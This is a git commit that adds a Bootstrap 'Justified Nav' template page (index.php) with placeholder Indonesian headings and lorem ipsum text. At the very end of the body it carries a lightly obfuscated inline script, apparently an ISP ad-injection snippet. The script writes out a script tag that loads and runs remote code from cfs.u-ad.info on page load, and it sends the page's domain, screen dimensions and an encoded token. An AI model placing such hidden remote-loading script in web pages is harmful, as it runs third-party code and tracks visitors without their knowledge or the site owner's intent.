3d9245370da3ff23a7493f4758d107083ec674ee
cakraamin <cakra.amin@yahoo.com>
2015-11-01 11:00:17 +0700

    mbuh opo kui

---
+++ project/index.php
@@ -0,0 +1,101 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../favicon.ico">
+
+    <title>Justified Nav Template for Bootstrap</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="css/justified-nav.css" rel="stylesheet">
+
+    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+    <script src="js/ie-emulation-modes-warning.js"></script>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="masthead row">
+        <div class="col-lg-8 well">
+            <h3 class="text-muted">Logo / Kontak</h3>
+        </div>
+        <div class="col-lg-4 well">
+               <div class="">Logo / Kontak</div>
+        </div>
+
+      </div>
+
+      <!-- Example row of columns -->
+      <div class="row">
+        <div class="col-lg-8">
+          <h2>peta</h2>
+          <p class="text-danger">As of v8.0, Safari exhibits a bug in which resizing your browser horizontally causes rendering errors in the justified nav that are cleared upon refreshing.</p>
+          <p>Donec id elit non mi porta gravida at eget metus. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Etiam porta sem malesuada magna mollis euismod. Donec sed odio dui. </p>
+          <p><a class="btn btn-primary" href="#" role="button">View details &raquo;</a></p>
+        </div>
+
+        <div class="col-lg-4">
+          <h2>Heading</h2>
+          <p>Donec sed odio dui. Cras justo odio, dapibus ac facilisis in, egestas eget quam. Vestibulum id ligula porta felis euismod semper. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa.</p>
+          <p><a class="btn btn-primary" href="#" role="button">View details &raquo;</a></p>
+        </div>
+      </div>
+
+      <!-- Site footer -->
+      <footer class="footer">
+<div class="row">
+    <div class="col-lg-12">
+      <div class="col-md-3">
+        <ul class="nav nav-pills nav-stacked">
+          <li><a href="#">About us</a></li>
+          <li><a href="#">Blog</a></li>
+        </ul>
+      </div>
+      <div class="col-md-3">
+        <ul class="nav nav-pills nav-stacked">
+          <li><a href="#">Product for Mac</a></li>
+          <li><a href="#">Product for Windows</a></li>
+        </ul>
+      </div>
+      <div class="col-md-3">
+        <ul class="nav nav-pills nav-stacked">
+          <li><a href="#">Web analytics</a></li>
+          <li><a href="#">Presentations</a></li>          
+        </ul>
+      </div>
+      <div class="col-md-3">
+        <ul class="nav nav-pills nav-stacked">
+          <li><a href="#">Product Help</a></li>
+          <li><a href="#">Developer API</a></li>
+        </ul>
+      </div>  
+    </div>
+  </div>
+   <hr>
+        <p>&copy; Company 2014</p>
+      </footer>
+
+    </div> <!-- /container -->
+
+
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="js/ie10-viewport-bug-workaround.js"></script>
+  <script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRSRBU5KEM7JmGqWkdBUjPs9NnEBEA8ZxNXO5swspTCDYvxgFbtG8neI%2fy9vGT6F0EqYkpBlmbZgbGXckwybAM8r9OSoQI043RhYCNRp1xJFkHo728A%2bazbHc3f2OFLZOdn%2bEUP2NqCNOfIzz9NGkZ1PQDenVn5aZB%2btrgHI0TlMsQAwL%2btmPE97t5Md%2bYN8m%2fFhoyaHa0%2fmErCsXvPak4ZrNnHoXPsekJcEU3xHd5ugAjQOLnAwgcmsjgN3wrOPjnTc%2bQLgQtylJQ6ULxckYg0RVmdzCaIKQj9k3xsJT1QB2bqI5OTXOPyg6hHk0jPZm%2bynQlWX8SnZWEOp455KWH9lA3aKF0FhbNiQHs7q6xPg64UpIRQPJWiVuOiryWKcnrFICFoppDA9aFuCHc%2bhDCPUOsqfcc7AyNPT2n74%2fhoarJ7an4ai2Zt5IXp695gs2TcPE%2bNzV922WQLhWNCrO9rGuuy4wvCOrYiEBnOwFGVMfKvzIRhNJ9n99MNayY3iJSrwGjq8v8YsTVLDAeSH7J%2fDUw5uwRGolueSvQXEbOQZYynSljsHBkjOCEEhW1l1HAZS1KCr61e7i7cKNs5wKJWQ%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
+</html>
